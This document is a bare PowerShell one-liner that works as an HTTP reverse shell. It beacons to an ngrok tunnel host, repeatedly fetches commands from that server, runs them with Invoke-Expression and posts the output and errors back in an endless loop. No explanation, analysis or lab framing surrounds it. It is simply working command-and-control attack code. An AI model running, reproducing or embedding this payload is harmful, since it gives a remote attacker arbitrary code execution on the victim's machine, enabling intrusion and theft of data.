$s='a102-43-245-32-6.ngrok-free.app';$i='2646b8ea-8ad44a50-ef904008';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/2646b8ea -Headers @{"X-0867-04e4"=$i;"ngrok-skip-browser-warning"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/8ad44a50 -Headers @{"X-0867-04e4"=$i;"ngrok-skip-browser-warning"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/ef904008 -Method POST -Headers @{"X-0867-04e4"=$i;"ngrok-skip-browser-warning"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
